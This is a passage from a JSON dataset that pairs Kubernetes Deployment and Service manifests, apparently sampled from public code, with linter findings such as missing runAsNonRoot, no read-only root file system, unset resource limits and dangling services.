    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:demo-voting-app name:redis-pod])"
  },
  {
    "id": "9610",
    "manifest_path": "data/manifests/the_stack_sample/sample_3674.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: quarkus-portfolio\n  labels:\n    app.kubernetes.io/part-of: Quarkus-DayTrader\n    app.kubernetes.io/name: quarkus\nspec:\n  selector:\n    matchLabels:\n      app: quarkus-portfolio\n  template:\n    metadata:\n      labels:\n        app: quarkus-portfolio\n    spec:\n      containers:\n      - name: tradr\n        image: quay.io/kameshsampath/quarkus-portfolio:1.0.0\n        imagePullPolicy: Always\n        env:\n        - name: PORT\n          value: '8080'\n        resources:\n          limits:\n            memory: 512Mi\n            cpu: 500m\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"tradr\" does not have a read-only root file system"
  },
  {
    "id": "9611",
    "manifest_path": "data/manifests/the_stack_sample/sample_3674.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: quarkus-portfolio\n  labels:\n    app.kubernetes.io/part-of: Quarkus-DayTrader\n    app.kubernetes.io/name: quarkus\nspec:\n  selector:\n    matchLabels:\n      app: quarkus-portfolio\n  template:\n    metadata:\n      labels:\n        app: quarkus-portfolio\n    spec:\n      containers:\n      - name: tradr\n        image: quay.io/kameshsampath/quarkus-portfolio:1.0.0\n        imagePullPolicy: Always\n        env:\n        - name: PORT\n          value: '8080'\n        resources:\n          limits:\n            memory: 512Mi\n            cpu: 500m\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"tradr\" is not set to runAsNonRoot"
  },
  {
    "id": "9612",
    "manifest_path": "data/manifests/the_stack_sample/sample_3674.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: quarkus-portfolio\n  labels:\n    app.kubernetes.io/part-of: Quarkus-DayTrader\n    app.kubernetes.io/name: quarkus\nspec:\n  selector:\n    matchLabels:\n      app: quarkus-portfolio\n  template:\n    metadata:\n      labels:\n        app: quarkus-portfolio\n    spec:\n      containers:\n      - name: tradr\n        image: quay.io/kameshsampath/quarkus-portfolio:1.0.0\n        imagePullPolicy: Always\n        env:\n        - name: PORT\n          value: '8080'\n        resources:\n          limits:\n            memory: 512Mi\n            cpu: 500m\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"tradr\" has cpu request 0"
  },
  {
    "id": "9613",
    "manifest_path": "data/manifests/the_stack_sample/sample_3675.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: payara-operator\n  labels:\n    app: operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: operator\n  template:\n    metadata:\n      labels:\n        app: operator\n    spec:\n      containers:\n      - name: operator\n        image: payara-operator:0.2\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"operator\" does not have a read-only root file system"
  },
  {
    "id": "9614",
    "manifest_path": "data/manifests/the_stack_sample/sample_3675.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: payara-operator\n  labels:\n    app: operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: operator\n  template:\n    metadata:\n      labels:\n        app: operator\n    spec:\n      containers:\n      - name: operator\n        image: payara-operator:0.2\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"operator\" is not set to runAsNonRoot"
  },
  {
    "id": "9615",
    "manifest_path": "data/manifests/the_stack_sample/sample_3675.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: payara-operator\n  labels:\n    app: operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: operator\n  template:\n    metadata:\n      labels:\n        app: operator\n    spec:\n      containers:\n      - name: operator\n        image: payara-operator:0.2\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"operator\" has cpu request 0"
  },
  {
    "id": "9616",
    "manifest_path": "data/manifests/the_stack_sample/sample_3675.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: payara-operator\n  labels:\n    app: operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: operator\n  template:\n    metadata:\n      labels:\n        app: operator\n    spec:\n      containers:\n      - name: operator\n        image: payara-operator:0.2\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"operator\" has memory limit 0"
  },
  {
    "id": "9617",
    "manifest_path": "data/manifests/the_stack_sample/sample_3677.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-cleaner\n  labels:\n    app: prow\n    component: boskos-cleaner\n  namespace: ci\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: boskos-cleaner\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: boskos-cleaner\n    spec:\n      serviceAccountName: boskos\n      containers:\n      - name: boskos-cleaner\n        image: gcr.io/k8s-staging-boskos/cleaner:v20210202-2ad7bab\n        args:\n        - --boskos-url=http://boskos\n        - --use-v2-implementation=true\n        - --namespace=$(namespace)\n        - --log-level=debug\n        env:\n        - name: namespace\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"boskos-cleaner\" does not have a read-only root file system"
  },
  {
    "id": "9618",
    "manifest_path": "data/manifests/the_stack_sample/sample_3677.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-cleaner\n  labels:\n    app: prow\n    component: boskos-cleaner\n  namespace: ci\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: boskos-cleaner\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: boskos-cleaner\n    spec:\n      serviceAccountName: boskos\n      containers:\n      - name: boskos-cleaner\n        image: gcr.io/k8s-staging-boskos/cleaner:v20210202-2ad7bab\n        args:\n        - --boskos-url=http://boskos\n        - --use-v2-implementation=true\n        - --namespace=$(namespace)\n        - --log-level=debug\n        env:\n        - name: namespace\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"boskos\" not found"
  },
  {
    "id": "9619",
    "manifest_path": "data/manifests/the_stack_sample/sample_3677.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-cleaner\n  labels:\n    app: prow\n    component: boskos-cleaner\n  namespace: ci\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: boskos-cleaner\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: boskos-cleaner\n    spec:\n      serviceAccountName: boskos\n      containers:\n      - name: boskos-cleaner\n        image: gcr.io/k8s-staging-boskos/cleaner:v20210202-2ad7bab\n        args:\n        - --boskos-url=http://boskos\n        - --use-v2-implementation=true\n        - --namespace=$(namespace)\n        - --log-level=debug\n        env:\n        - name: namespace\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"boskos-cleaner\" is not set to runAsNonRoot"
  },
  {
    "id": "9620",
    "manifest_path": "data/manifests/the_stack_sample/sample_3677.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-cleaner\n  labels:\n    app: prow\n    component: boskos-cleaner\n  namespace: ci\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: boskos-cleaner\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: boskos-cleaner\n    spec:\n      serviceAccountName: boskos\n      containers:\n      - name: boskos-cleaner\n        image: gcr.io/k8s-staging-boskos/cleaner:v20210202-2ad7bab\n        args:\n        - --boskos-url=http://boskos\n        - --use-v2-implementation=true\n        - --namespace=$(namespace)\n        - --log-level=debug\n        env:\n        - name: namespace\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"boskos-cleaner\" has cpu request 0"
  },
  {
    "id": "9621",
    "manifest_path": "data/manifests/the_stack_sample/sample_3677.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-cleaner\n  labels:\n    app: prow\n    component: boskos-cleaner\n  namespace: ci\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: boskos-cleaner\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: boskos-cleaner\n    spec:\n      serviceAccountName: boskos\n      containers:\n      - name: boskos-cleaner\n        image: gcr.io/k8s-staging-boskos/cleaner:v20210202-2ad7bab\n        args:\n        - --boskos-url=http://boskos\n        - --use-v2-implementation=true\n        - --namespace=$(namespace)\n        - --log-level=debug\n        env:\n        - name: namespace\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"boskos-cleaner\" has memory limit 0"
  },
  {
    "id": "9622",
    "manifest_path": "data/manifests/the_stack_sample/sample_3681.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: log-generator\n  name: log-generator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: log-generator\n  template:\n    metadata:\n      labels:\n        app: log-generator\n    spec:\n      containers:\n      - name: log-generator\n        image: diebietse/log-generator:v0.1.0\n        imagePullPolicy: Always\n        env:\n        - name: LOG_SOURCE_FILE_PATH\n          value: /data/log-config\n        volumeMounts:\n        - name: log-config\n          mountPath: /data/log-config\n          subPath: log-config\n          readOnly: true\n        resources:\n          limits:\n            cpu: 150m\n            memory: 32Mi\n          requests:\n            cpu: 150m\n            memory: 32Mi\n      volumes:\n      - name: log-config\n        configMap:\n          name: log-config\n          items:\n          - key: log-config\n            path: log-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"log-generator\" does not have a read-only root file system"
  },
  {
    "id": "9623",
    "manifest_path": "data/manifests/the_stack_sample/sample_3681.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: log-generator\n  name: log-generator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: log-generator\n  template:\n    metadata:\n      labels:\n        app: log-generator\n    spec:\n      containers:\n      - name: log-generator\n        image: diebietse/log-generator:v0.1.0\n        imagePullPolicy: Always\n        env:\n        - name: LOG_SOURCE_FILE_PATH\n          value: /data/log-config\n        volumeMounts:\n        - name: log-config\n          mountPath: /data/log-config\n          subPath: log-config\n          readOnly: true\n        resources:\n          limits:\n            cpu: 150m\n            memory: 32Mi\n          requests:\n            cpu: 150m\n            memory: 32Mi\n      volumes:\n      - name: log-config\n        configMap:\n          name: log-config\n          items:\n          - key: log-config\n            path: log-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"log-generator\" is not set to runAsNonRoot"
  },
  {
    "id": "9624",
    "manifest_path": "data/manifests/the_stack_sample/sample_3683.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: komodor-create-container-config-error\n  namespace: default\n  labels:\n    app: komodor-create-error\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: komodor-create-error\n  template:\n    metadata:\n      labels:\n        app: komodor-create-error\n    spec:\n      containers:\n      - name: crash-demo\n        image: nginx:1.21.6\n        env:\n        - name: SECRET_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: api-access-token\n              key: SECRET_TOKEN\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9625",
    "manifest_path": "data/manifests/the_stack_sample/sample_3683.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: komodor-create-container-config-error\n  namespace: default\n  labels:\n    app: komodor-create-error\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: komodor-create-error\n  template:\n    metadata:\n      labels:\n        app: komodor-create-error\n    spec:\n      containers:\n      - name: crash-demo\n        image: nginx:1.21.6\n        env:\n        - name: SECRET_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: api-access-token\n              key: SECRET_TOKEN\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"crash-demo\" does not have a read-only root file system"
  },
  {
    "id": "9626",
    "manifest_path": "data/manifests/the_stack_sample/sample_3683.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: komodor-create-container-config-error\n  namespace: default\n  labels:\n    app: komodor-create-error\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: komodor-create-error\n  template:\n    metadata:\n      labels:\n        app: komodor-create-error\n    spec:\n      containers:\n      - name: crash-demo\n        image: nginx:1.21.6\n        env:\n        - name: SECRET_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: api-access-token\n              key: SECRET_TOKEN\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"crash-demo\" is not set to runAsNonRoot"
  },
  {
    "id": "9627",
    "manifest_path": "data/manifests/the_stack_sample/sample_3683.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: komodor-create-container-config-error\n  namespace: default\n  labels:\n    app: komodor-create-error\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: komodor-create-error\n  template:\n    metadata:\n      labels:\n        app: komodor-create-error\n    spec:\n      containers:\n      - name: crash-demo\n        image: nginx:1.21.6\n        env:\n        - name: SECRET_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: api-access-token\n              key: SECRET_TOKEN\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"crash-demo\" has cpu request 0"
  },
  {
    "id": "9628",
    "manifest_path": "data/manifests/the_stack_sample/sample_3683.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: komodor-create-container-config-error\n  namespace: default\n  labels:\n    app: komodor-create-error\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: komodor-create-error\n  template:\n    metadata:\n      labels:\n        app: komodor-create-error\n    spec:\n      containers:\n      - name: crash-demo\n        image: nginx:1.21.6\n        env:\n        - name: SECRET_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: api-access-token\n              key: SECRET_TOKEN\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"crash-demo\" has memory limit 0"
  },
  {
    "id": "9629",
    "manifest_path": "data/manifests/the_stack_sample/sample_3684.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: logger-server\n  labels:\n    app: logger-server\nspec:\n  selector:\n    matchLabels:\n      app: logger-server\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: logger-server\n        version: v2\n    spec:\n      containers:\n      - name: logger-server\n        image: hdwinkel/logger-server-jvm-arm64:v2\n        env:\n        - name: QUARKUS_DATASOURCE_URL\n          value: jdbc:mysql://192.168.188.40:3306/logger\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9630",
    "manifest_path": "data/manifests/the_stack_sample/sample_3684.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: logger-server\n  labels:\n    app: logger-server\nspec:\n  selector:\n    matchLabels:\n      app: logger-server\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: logger-server\n        version: v2\n    spec:\n      containers:\n      - name: logger-server\n        image: hdwinkel/logger-server-jvm-arm64:v2\n        env:\n        - name: QUARKUS_DATASOURCE_URL\n          value: jdbc:mysql://192.168.188.40:3306/logger\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"logger-server\" does not have a read-only root file system"
  },
  {
    "id": "9631",
    "manifest_path": "data/manifests/the_stack_sample/sample_3684.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: logger-server\n  labels:\n    app: logger-server\nspec:\n  selector:\n    matchLabels:\n      app: logger-server\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: logger-server\n        version: v2\n    spec:\n      containers:\n      - name: logger-server\n        image: hdwinkel/logger-server-jvm-arm64:v2\n        env:\n        - name: QUARKUS_DATASOURCE_URL\n          value: jdbc:mysql://192.168.188.40:3306/logger\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"logger-server\" is not set to runAsNonRoot"
  },
  {
    "id": "9632",
    "manifest_path": "data/manifests/the_stack_sample/sample_3684.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: logger-server\n  labels:\n    app: logger-server\nspec:\n  selector:\n    matchLabels:\n      app: logger-server\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: logger-server\n        version: v2\n    spec:\n      containers:\n      - name: logger-server\n        image: hdwinkel/logger-server-jvm-arm64:v2\n        env:\n        - name: QUARKUS_DATASOURCE_URL\n          value: jdbc:mysql://192.168.188.40:3306/logger\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"logger-server\" has cpu request 0"
  },
  {
    "id": "9633",
    "manifest_path": "data/manifests/the_stack_sample/sample_3684.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: logger-server\n  labels:\n    app: logger-server\nspec:\n  selector:\n    matchLabels:\n      app: logger-server\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: logger-server\n        version: v2\n    spec:\n      containers:\n      - name: logger-server\n        image: hdwinkel/logger-server-jvm-arm64:v2\n        env:\n        - name: QUARKUS_DATASOURCE_URL\n          value: jdbc:mysql://192.168.188.40:3306/logger\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"logger-server\" has memory limit 0"
  },
  {
    "id": "9634",
    "manifest_path": "data/manifests/the_stack_sample/sample_3687.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sso-client-app-1\n  namespace: default\n  labels:\n    app: sso-client-app-1\n    tier: frontend\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sso-client-app-1\n      tier: frontend\n  template:\n    metadata:\n      labels:\n        app: sso-client-app-1\n        tier: frontend\n    spec:\n      containers:\n      - name: sso-client-app-1\n        image: sso-client-app-1\n        ports:\n        - containerPort: 8080\n          name: http-server\n        env:\n        - name: SSO-RESOURCE-SERVER_API_ADDR\n          value: http://sso-resource-server/api/foos/\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"sso-client-app-1\" is using an invalid container image, \"sso-client-app-1\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9635",
    "manifest_path": "data/manifests/the_stack_sample/sample_3687.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sso-client-app-1\n  namespace: default\n  labels:\n    app: sso-client-app-1\n    tier: frontend\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sso-client-app-1\n      tier: frontend\n  template:\n    metadata:\n      labels:\n        app: sso-client-app-1\n        tier: frontend\n    spec:\n      containers:\n      - name: sso-client-app-1\n        image: sso-client-app-1\n        ports:\n        - containerPort: 8080\n          name: http-server\n        env:\n        - name: SSO-RESOURCE-SERVER_API_ADDR\n          value: http://sso-resource-server/api/foos/\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sso-client-app-1\" does not have a read-only root file system"
  },
  {
    "id": "9636",
    "manifest_path": "data/manifests/the_stack_sample/sample_3687.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sso-client-app-1\n  namespace: default\n  labels:\n    app: sso-client-app-1\n    tier: frontend\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sso-client-app-1\n      tier: frontend\n  template:\n    metadata:\n      labels:\n        app: sso-client-app-1\n        tier: frontend\n    spec:\n      containers:\n      - name: sso-client-app-1\n        image: sso-client-app-1\n        ports:\n        - containerPort: 8080\n          name: http-server\n        env:\n        - name: SSO-RESOURCE-SERVER_API_ADDR\n          value: http://sso-resource-server/api/foos/\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sso-client-app-1\" is not set to runAsNonRoot"
  },
  {
    "id": "9637",
    "manifest_path": "data/manifests/the_stack_sample/sample_3687.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sso-client-app-1\n  namespace: default\n  labels:\n    app: sso-client-app-1\n    tier: frontend\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sso-client-app-1\n      tier: frontend\n  template:\n    metadata:\n      labels:\n        app: sso-client-app-1\n        tier: frontend\n    spec:\n      containers:\n      - name: sso-client-app-1\n        image: sso-client-app-1\n        ports:\n        - containerPort: 8080\n          name: http-server\n        env:\n        - name: SSO-RESOURCE-SERVER_API_ADDR\n          value: http://sso-resource-server/api/foos/\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sso-client-app-1\" has cpu request 0"
  },
  {
    "id": "9638",
    "manifest_path": "data/manifests/the_stack_sample/sample_3687.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sso-client-app-1\n  namespace: default\n  labels:\n    app: sso-client-app-1\n    tier: frontend\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sso-client-app-1\n      tier: frontend\n  template:\n    metadata:\n      labels:\n        app: sso-client-app-1\n        tier: frontend\n    spec:\n      containers:\n      - name: sso-client-app-1\n        image: sso-client-app-1\n        ports:\n        - containerPort: 8080\n          name: http-server\n        env:\n        - name: SSO-RESOURCE-SERVER_API_ADDR\n          value: http://sso-resource-server/api/foos/\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sso-client-app-1\" has memory limit 0"
  },
  {
    "id": "9639",
    "manifest_path": "data/manifests/the_stack_sample/sample_3690.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: upload-deployment\n  labels:\n    app: upload\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: upload\n  template:\n    metadata:\n      labels:\n        app: upload\n    spec:\n      containers:\n      - name: upload\n        image: busybox\n        ports:\n        - containerPort: 80\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"upload\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9640",
    "manifest_path": "data/manifests/the_stack_sample/sample_3690.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: upload-deployment\n  labels:\n    app: upload\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: upload\n  template:\n    metadata:\n      labels:\n        app: upload\n    spec:\n      containers:\n      - name: upload\n        image: busybox\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"upload\" does not have a read-only root file system"
  },
  {
    "id": "9641",
    "manifest_path": "data/manifests/the_stack_sample/sample_3690.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: upload-deployment\n  labels:\n    app: upload\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: upload\n  template:\n    metadata:\n      labels:\n        app: upload\n    spec:\n      containers:\n      - name: upload\n        image: busybox\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"upload\" is not set to runAsNonRoot"
  },
  {
    "id": "9642",
    "manifest_path": "data/manifests/the_stack_sample/sample_3690.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: upload-deployment\n  labels:\n    app: upload\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: upload\n  template:\n    metadata:\n      labels:\n        app: upload\n    spec:\n      containers:\n      - name: upload\n        image: busybox\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"upload\" has cpu request 0"
  },
  {
    "id": "9643",
    "manifest_path": "data/manifests/the_stack_sample/sample_3690.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: upload-deployment\n  labels:\n    app: upload\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: upload\n  template:\n    metadata:\n      labels:\n        app: upload\n    spec:\n      containers:\n      - name: upload\n        image: busybox\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"upload\" has memory limit 0"
  },
  {
    "id": "9644",
    "manifest_path": "data/manifests/the_stack_sample/sample_3691.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: ghproxy\n  namespace: prow\n  name: ghproxy\nspec:\n  ports:\n  - name: main\n    port: 80\n    protocol: TCP\n    targetPort: 8888\n  - name: metrics\n    port: 9090\n  selector:\n    app: ghproxy\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:ghproxy])"
  },
  {
    "id": "9645",
    "manifest_path": "data/manifests/the_stack_sample/sample_3692.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: mynapp-svc-roll\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 80\n    targetPort: 8080\n  selector:\n    app: mynapp-rc\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:mynapp-rc])"
  },
  {
    "id": "9646",
    "manifest_path": "data/manifests/the_stack_sample/sample_3693.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hello-dep\n  namespace: default\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: hello-dep\n  template:\n    metadata:\n      labels:\n        app: hello-dep\n    spec:\n      containers:\n      - image: gcr.io/google-samples/hello-app:1.0\n        imagePullPolicy: Always\n        name: hello-dep\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          successThreshold: 1\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9647",
    "manifest_path": "data/manifests/the_stack_sample/sample_3693.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hello-dep\n  namespace: default\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: hello-dep\n  template:\n    metadata:\n      labels:\n        app: hello-dep\n    spec:\n      containers:\n      - image: gcr.io/google-samples/hello-app:1.0\n        imagePullPolicy: Always\n        name: hello-dep\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          successThreshold: 1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hello-dep\" does not have a read-only root file system"
  },
  {
    "id": "9648",
    "manifest_path": "data/manifests/the_stack_sample/sample_3693.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hello-dep\n  namespace: default\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: hello-dep\n  template:\n    metadata:\n      labels:\n        app: hello-dep\n    spec:\n      containers:\n      - image: gcr.io/google-samples/hello-app:1.0\n        imagePullPolicy: Always\n        name: hello-dep\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          successThreshold: 1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hello-dep\" is not set to runAsNonRoot"
  },
  {
    "id": "9649",
    "manifest_path": "data/manifests/the_stack_sample/sample_3693.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hello-dep\n  namespace: default\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: hello-dep\n  template:\n    metadata:\n      labels:\n        app: hello-dep\n    spec:\n      containers:\n      - image: gcr.io/google-samples/hello-app:1.0\n        imagePullPolicy: Always\n        name: hello-dep\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          successThreshold: 1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hello-dep\" has cpu request 0"
  },
  {
    "id": "9650",
    "manifest_path": "data/manifests/the_stack_sample/sample_3693.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hello-dep\n  namespace: default\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: hello-dep\n  template:\n    metadata:\n      labels:\n        app: hello-dep\n    spec:\n      containers:\n      - image: gcr.io/google-samples/hello-app:1.0\n        imagePullPolicy: Always\n        name: hello-dep\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          successThreshold: 1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hello-dep\" has memory limit 0"
  },
  {
    "id": "9651",
    "manifest_path": "data/manifests/the_stack_sample/sample_3694.yaml",
